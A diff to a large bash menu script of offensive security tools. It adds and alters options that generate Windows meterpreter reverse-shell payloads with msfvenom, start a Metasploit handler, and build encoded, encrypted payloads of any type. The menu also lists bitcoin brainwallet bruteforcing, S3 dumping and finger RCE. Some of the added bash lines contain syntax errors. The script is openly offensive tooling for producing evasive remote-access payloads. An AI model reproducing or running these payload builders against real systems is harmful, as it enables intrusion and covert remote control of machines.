@@ -1101,6 +1101,7 @@ while true; do
 	Stampa " 2452. AWS S3 copy file to remote host" "2453. AWS S3 list file in remote host" "2454. AWS S3 dump dynamodb tables"
 	Stampa " 2457. install poetry" "2503. run dbg and disassembling a bin file" "751. RCE with finger"
 	Stampa " 2515. Create a Reverse Shell for Android and run a listener" "2539. Create a Reverse Shell for Windows x86 and run a listener" "2540. Create a Reverse Shell for Windows x64 and run a listener"
+	Stampa " 2542. get ASN and infos of target IP from cymru.com"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -10322,7 +10323,7 @@ while true; do
 						read -p "(default, 10): " -i "10" ITE
 						if [[ "$ITE" =~ ^[0-9]+$ ]];
 						then
-							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_32bit.$EXT
+							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_32bit.$EXT
 							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
 						fi
 						break
@@ -10349,7 +10350,7 @@ while true; do
 						read -p "(default, 10): " -i "10" ITE
 						if [[ "$ITE" =~ ^[0-9]+$ ]];
 						then
-							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT > reverse_64bit.$EXT
+							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_64bit.$EXT
 							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
 						fi
 						break
@@ -10361,6 +10362,55 @@ while true; do
 	;;
 	"2541")
 		Clona "avilum/portsscan"
+	;;
+	"2542")
+		echo "Digit a target IP address"
+		read -p "(example, 10.11.12.13): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			whois -h whois.cymru.com "$TIP"
+		fi
+	;;
+	"2543")
+		echo "Digit your IP"
+		read -p "(example, 192.168.1.1): " MIP
+		if [["$MIP" != "" ]];
+		then
+			echo "Digit your PORT"
+			read -p "(default 9001): " -i "9001" MPRT
+			if [["$MPRT" == "" ]];
+			then
+				MPRT="9001"
+			fi
+			select PAY in $(msfvenom -l payloads | awk '{print $1}')
+			do
+				select ARC in $(msfvenom -l archs | awk '{print $1}')
+				do
+					select ENC in $(msfvenom -l encoders | awk '{print $1}')
+					do
+						echo "Digit how many time encode the payload"
+						read -p "(default 10): " -i "10" ITE
+						if [[ "$ITE" == "" ]];
+						then
+							ITE="10"
+						fi
+						select FORM in $(msfvenom -l formats | awk '{print $1}')
+						do
+							select CRYP in $(msfvenom -l encrypt | awk '{print $1}')
+							do
+								echo "Digit a passphare; if it be empty, it will be created pseudo-randomly"
+								read -p "(default is empty): " PSSP
+								if [[ "$PSSP" == "" ]];
+								then
+									PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 128)
+								fi
+								msfvenom -p "$PAY" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
+							done
+						done
+					done
+				done
+			done
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
